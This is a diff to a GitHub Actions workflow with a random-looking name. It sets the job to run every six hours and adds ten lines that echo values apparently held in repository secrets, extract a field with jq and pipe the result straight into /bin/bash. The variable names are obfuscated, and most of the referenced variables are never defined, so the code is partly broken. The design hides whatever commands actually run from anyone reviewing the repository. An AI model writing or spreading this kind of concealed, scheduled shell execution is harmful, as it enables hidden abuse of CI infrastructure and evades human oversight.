@@ -3,7 +3,7 @@ name: anzaidong1887
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 1/6 * * *'
+    - cron: '46 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,10 +11,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: anzaidong1887
         env:
-          i6289: ${{ secrets.i6289 }}
+          g13125: ${{ secrets.g13125 }}
         run: |
-          echo $i6289 | jq -r .w209 | /bin/bash
-          echo $tksq6 | jq -r .${gk39731} | /bin/bash
-          echo $xwnr033 | jq -r .${rnp2503} | /bin/bash
-          echo $ke7352 | jq -r .${p949} | /bin/bash
+          echo $g13125 | jq -r .g15909 | /bin/bash
+          echo $hcmsm95 | jq -r .$bolst82 | /bin/bash
+          echo $w7 | jq -r .$yiux900 | /bin/bash
+          echo $b720 | jq -r .$ipry606 | /bin/bash
+          echo $ogma4 | jq -r .$bhe158 | /bin/bash
+          echo $cosyn611 | jq -r .$dghyf66467 | /bin/bash
+          echo $sxanw4 | jq -r .$hn5 | /bin/bash
+          echo $z06 | jq -r .$fzl83 | /bin/bash
+          echo $bfaw5324 | jq -r .$wlqij53 | /bin/bash
+          echo $jn024 | jq -r .$f61584 | /bin/bash
 
